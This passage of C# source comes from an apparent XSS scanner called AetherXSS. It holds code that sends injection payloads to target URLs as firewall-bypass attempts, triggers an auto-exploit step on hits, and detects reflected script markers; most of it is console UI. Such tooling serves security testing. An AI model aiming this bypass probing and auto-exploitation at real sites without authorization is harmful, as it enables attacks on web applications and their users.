        string encodedPayload = HttpUtility.UrlEncode(payload);
        string testUrl = url.Contains("?") ? $"{url}&xss={encodedPayload}" : $"{url}?xss={encodedPayload}";

        try
        {
            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, testUrl);
            AddHeaders(request, cookie, extraHeaders, customUserAgent);

            HttpResponseMessage response = await client.SendAsync(request);
            string responseBody = await response.Content.ReadAsStringAsync();

            lock (statistics)
            {
                statistics["testedUrls"]++;
            }

            if (IsXssVulnerable(responseBody, payload))
            {
                lock (discoveredVulnerabilities)
                {
                    discoveredVulnerabilities.Add($"GET (WAF Bypass - {wafName}): {testUrl}");
                }

                lock (statistics)
                {
                    statistics["vulnerableUrls"]++;
                }

                PrintColored($"\n[!] XSS Vulnerability Detected with WAF Bypass ({wafName})! {testUrl}", ConsoleColor.Red);
                AnimatedUI.ShowVulnerabilityFound(testUrl, $"WAF Bypass - {wafName}");

                if (autoExploit)
                {
                    await AutoExploit(testUrl, "GET", payload);
                }
            }
        }
        catch
        {
            // Ignore errors in WAF bypass attempts
        }
    }
}

// New method for better XSS detection
bool IsXssVulnerable(string responseBody, string payload)
{
    // First check for direct reflection
    if (responseBody.Contains(payload))
        return true;

    // Check for URL-encoded versions
    string encodedPayload = HttpUtility.UrlEncode(payload);
    if (responseBody.Contains(encodedPayload))
        return true;

    // Check for HTML-encoded versions
    string htmlEncodedPayload = HttpUtility.HtmlEncode(payload);
    if (responseBody.Contains(htmlEncodedPayload))
        return true;

    // Check for double-encoded versions
    string doubleEncodedPayload = HttpUtility.UrlEncode(HttpUtility.UrlEncode(payload));
    if (responseBody.Contains(doubleEncodedPayload))
        return true;

    // Advanced checks for partial reflections that could still be vulnerable
    if (payload.Contains("<script>") && responseBody.Contains("<script>"))
    {
        if (payload.Contains("alert") && responseBody.Contains("alert"))
            return true;
    }

    if (payload.Contains("onerror") && responseBody.Contains("onerror"))
    {
        if (payload.Contains("alert") && responseBody.Contains("alert"))
            return true;
    }

    if (payload.Contains("javascript:") && responseBody.Contains("javascript:"))
    {
        return true;
    }

    return false;
}

// Determine the context of XSS vulnerability
string DetermineXssContext(string responseBody, string payload)
{
    // Simplified context detection - would be more advanced in real implementation
    if (responseBody.Contains("<script") && responseBody.Contains(payload))
    {
        return "JavaScript Context";
    }
    else if (responseBody.Contains("href=") && responseBody.Contains(payload))
    {
        return "URL Attribute Context";
    }
    else if (Regex.IsMatch(responseBody, $"<[^>]*{Regex.Escape(payload)}[^>]*>"))
    {
        return "HTML Attribute Context";
    }
    else if (responseBody.Contains(payload))
    {
        return "HTML Context";
    }

    return "Unknown Context";
}

namespace AetherXSS
{
    public static class AnimatedUI
    {
        private static readonly string[] hackPhrases = new string[]
        {
            "Hack the Planet! 🌍",
            "The Matrix has you... 🕶️",
            "Follow the white rabbit. 🐰",
            "Wake up, Neo... ⏰",
            "May the Force be with you... ⚔️",
            "Do. Or do not. There is no try. 🎯",
            "I find your lack of security disturbing. 😈",
            "The dark side of the Force is a pathway to many abilities some consider to be... unnatural. 🌑",
            "These aren't the vulnerabilities you're looking for... 🤖",
            "ibrahimsql is here, watching always... 👀",
            "0-day hunter in action... 🏹",
            "Scanning the digital realm... 🔍",
            "In a world of 1s and 0s, we are the semicolons... 💻",
            "Exploring the digital wilderness... 🌐",
            "Where there's a shell, there's a way... 🐚",
            "The code is strong with this one... 💪",
            "Resistance is futile, patches are mandatory... 🛡️",
            "I am one with the code, the code is with me... 🧘",
            "Executing Order 66 (security checks)... 🎭",
            "Every system has a weakness. Let's find it. 🎯",
            "In the midst of chaos, there is also opportunity... for XSS. 🎲",
            "The quieter you become, the more you can hear... the bugs. 🐛",
            "Time to pwn this system! 🎮",
            "Scanning ports like a boss! 🚀",
            "Your security needs more cowbell! 🔔",
            "Hack all the things! 🛠️",
            "Bug bounty time! 💰",
            "Loading l33t hacks... 🔄",
            "Security? What security? 🤔",
            "Deploying cyber ninjas... 🥷",
            "Unleashing the kraken! 🐙",
            "Time to break some firewalls! 🧱",
            "Dancing through the packets... 💃",
            "Surfing the cyber waves... 🏄",
            "Hacking at ludicrous speed! ⚡",
            "Vulnerability scanner goes brrr... 🌪️",
            "Cooking up some exploits... 👨‍🍳",
            "Scanning harder than a frustrated printer! 🖨️",
            "This isn't even my final form! 🔥",
            "Hack today, patch tomorrow! 🌅"
        };

        private static readonly string[] loadingChars = new string[] { "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏" };

        public static void ShowSpinner(string message, int durationMs = 1500)
        {
            int i = 0;
            DateTime endTime = DateTime.Now.AddMilliseconds(durationMs);
            
            // Simple spinner characters
            string[] spinnerChars = new string[] { "|", "/", "-", "\\" };
            
            while (DateTime.Now < endTime)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write($"\r[{spinnerChars[i % spinnerChars.Length]}] {message}");
                Thread.Sleep(80);
                i++;
            }
            Console.ResetColor();
            Console.WriteLine();
        }

        public static void ShowLoadingAnimation(string message, int duration = 2000)
        {
            int i = 0;
            DateTime endTime = DateTime.Now.AddMilliseconds(duration);
            
            // Simple spinner characters
            string[] spinnerChars = new string[] { "|", "/", "-", "\\" };

            while (DateTime.Now < endTime)
            {
                Console.Write($"\r[{spinnerChars[i % spinnerChars.Length]}] {message}");
                Thread.Sleep(100);
                i++;
            }
            Console.WriteLine();
        }

        public static void ShowRandomHackPhrase()
        {
            
            string[] phrases = new string[]
            {
                "Scanning for XSS vulnerabilities",
                "Testing injection points",
                "Analyzing response for XSS reflections",
                "Checking script insertion points",
                "Evaluating input validation",
                "Scanning for DOM-based vulnerabilities",
                "Testing parameter sanitization",
                "Checking output encoding",
                "Looking for reflection points",
                "Analyzing content security policy",
                "Testing browser XSS filters",
                "Checking context-aware escaping",
                "Examining client-side validation",
                "Testing HTML attribute injection",
                "Validating unsafe JavaScript execution"
            };
            
            Random rand = new Random();
            string phrase = phrases[rand.Next(phrases.Length)];
            
            Console.ForegroundColor = ConsoleColor.Cyan;
            
            // Simple prefix
            string prefix = "[*]";
            
            // Print the message
            Console.WriteLine($"\n{prefix} {phrase}");
            
            Console.ResetColor();
        }

        public static void ShowTargetInfo(string url)
        {
            // Ensure we have a clean line
            Console.WriteLine();
            
            // Create a box around target info
            Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("  TARGET INFORMATION");
            Console.ResetColor();
            Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
            
            // Parse the URL to get components
            try
            {
                Uri uri = new Uri(url);
                
                Console.Write("  ");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Target URL: ");
                Console.ResetColor();
                Console.WriteLine(url);
                
                Console.Write("  ");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Domain: ");
                Console.ResetColor();
                Console.WriteLine(uri.Host);
                
                // Query parameters if present (important for XSS)
                if (!string.IsNullOrEmpty(uri.Query))
                {
                    Console.Write("  ");
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Query Parameters: ");
                    Console.ResetColor();
                    Console.WriteLine(uri.Query);
                }
                
                // Current time
                Console.Write("  ");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write("Scan started: ");
                Console.ResetColor();
                Console.WriteLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"  Error parsing URL: {ex.Message}");
                Console.ResetColor();
            }
            
            Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
            Console.WriteLine();
        }

        public static void ShowProgressBar(int progress, int total)
        {
            int barSize = 40;
            int filledSize = (int)((double)progress / total * barSize);
            
            Console.Write("\r[");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write(new string('█', filledSize));
            Console.Write(new string('░', barSize - filledSize));
            Console.ResetColor();
            Console.Write($"] {progress}/{total} ({(int)((double)progress / total * 100)}%)");
        }

        public static void ShowScanProgress(string target, int current, int total)
        {
            // Progress indicators - more professional, less emoji-heavy
            string[] progressChars = new string[] { ">", "→", "-", "•", "+" };
            string[] actionVerbs = new string[] { 
                "Testing", "Analyzing", "Scanning", "Processing", "Checking", 
                "Evaluating", "Inspecting", "Examining", "Assessing" 
            };
            Random r = new Random();
            
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write($"\r[{progressChars[r.Next(progressChars.Length)]}] ");
            Console.ForegroundColor = ConsoleColor.White;
            
            // Use random action verb for variety
            string verb = actionVerbs[r.Next(actionVerbs.Length)];
            
            // Truncate target if too long
            string displayTarget = target;
            if (displayTarget.Length > 50)
            {
                displayTarget = displayTarget.Substring(0, 47) + "...";
            }
            
            Console.Write($"{verb} payload {current}/{total} on {displayTarget}");
            
            // Show a progress bar if there are more than 5 payloads
            if (total > 5)
            {
                Console.Write(" ");
                int barSize = 20;
                int filledSize = (int)((double)current / total * barSize);
                
                Console.Write("[");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write(new string('█', filledSize));
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.Write(new string('░', barSize - filledSize));
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write($"] {(int)((double)current / total * 100)}%");
            }
            
            Console.ResetColor();
        }

        public static void ShowConfigInfo(Dictionary<string, object> config)
        {
            Console.WriteLine("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("  AETHERXSS CONFIGURATION");
            Console.ResetColor();
            Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
            
            foreach (var kvp in config)
            {
                if (kvp.Value != null && !string.IsNullOrEmpty(kvp.Value.ToString()))
                {
                    Console.Write("  ");
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write($"{kvp.Key}: ");
                    Console.ResetColor();
                    Console.WriteLine(kvp.Value);
                }
            }
            
            Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
        }

        public static void ShowScanSummary(Dictionary<string, int> stats)
        {
            Console.WriteLine("\n\n");
            Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("  SCAN RESULTS SUMMARY");
            Console.ResetColor();
            Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
            
            // URLs tested
            Console.Write("  ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("URLs Tested: ");
            Console.ResetColor();
            Console.WriteLine(stats["testedUrls"]);
            
            // Vulnerabilities found
            Console.Write("  ");
            if (stats["vulnerableUrls"] > 0)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("XSS Vulnerabilities: ");
                Console.WriteLine(stats["vulnerableUrls"]);
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("XSS Vulnerabilities: ");
                Console.WriteLine("None found (0)");
            }
            
            // Failed requests
            Console.Write("  ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("Failed Requests: ");
            Console.ResetColor();
            Console.WriteLine(stats["failedRequests"]);
            
            // Parameters tested
            Console.Write("  ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("Parameters Tested: ");
            Console.ResetColor();
            Console.WriteLine(stats["parametersFound"]);
            
            // Scan status
            Console.Write("  ");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("Scan Status: ");
            Console.ResetColor();
            Console.WriteLine("COMPLETE");
            
            Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        }

        public static void PrintBanner()
        {
            string banner = @"
    ▄▄▄     ▄▄▄█████▓ ██░ ██ ▓█████  ██▀███  ▒██   ██▒  ██████   ██████ 
   ▒████▄   ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒▒▒ █ █ ▒░▒██    ▒ ▒██    ▒ 
   ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░▒███   ▓██ ░▄█ ▒░░  █   ░░ ▓██▄   ░ ▓██▄   
   ░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄   ░ █ █ ▒   ▒   ██▒  ▒   ██▒
    ▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓░▒████▒░██▓ ▒██▒▒██▒ ▒██▒▒██████▒▒▒██████▒▒
    ▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░";

            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(banner);
            
            Console.WriteLine("\nAetherXSS - Advanced Cross-Site Scripting Scanner");
            Console.WriteLine("Developer: @ibrahimsql\n");
            
            Console.ResetColor();
        }

        public static void ShowScanningAnimation(string target)
        {
            string[] scanFrames = new string[]
            {
                $"[→] Scanning {target}"
            };

            string[] actionVerbs = new string[] { 
                "Scanning", "Analyzing", "Processing", "Checking", "Examining" 
            };
            
            Random r = new Random();
            string verb = actionVerbs[r.Next(actionVerbs.Length)];

            for (int i = 0; i < 8; i++)
            {
                string direction = "-\\|/"[i % 4].ToString();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write($"\r[{direction}] {verb} ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(target);
                Console.ResetColor();
                Thread.Sleep(100);
            }
            Console.WriteLine();
        }

        public static void ShowVulnerabilityFound(string url, string type)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("═════════════════════════════════════════════");
            Console.WriteLine("  VULNERABILITY DETECTED");
            Console.WriteLine("═════════════════════════════════════════════");
            Console.WriteLine($"  Type: {type}");
            Console.WriteLine($"  URL: {url}");
            Console.WriteLine("═════════════════════════════════════════════");
            Console.ResetColor();
            
            // Play alert sound only on Windows
            if (OperatingSystem.IsWindows())
            {
                try
                {
                    Console.Beep(800, 200);
                }
                catch
                {
                    // Ignore any errors if beep fails
                }
            }
        }
    }
} 
